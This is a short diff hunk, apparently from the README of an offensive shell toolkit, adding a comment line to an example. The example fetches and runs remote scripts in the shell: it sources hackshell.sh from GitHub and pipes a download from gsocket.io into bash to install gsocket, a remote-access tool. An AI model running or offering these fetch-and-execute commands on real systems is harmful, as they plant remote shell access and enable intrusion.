@@ -1212,6 +1212,7 @@ sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx
 
 Example: Installing gsocket with purl:
 ```sh
+# cut & paste the above purl() function into your bash. Then cut & paste the following:
 source <(purl https://raw.githubusercontent.com/hackerschoice/hackshell/main/hackshell.sh) \
 && bin curl \
 && bash -c "$(curl -fsSL https://gsocket.io/y)" \
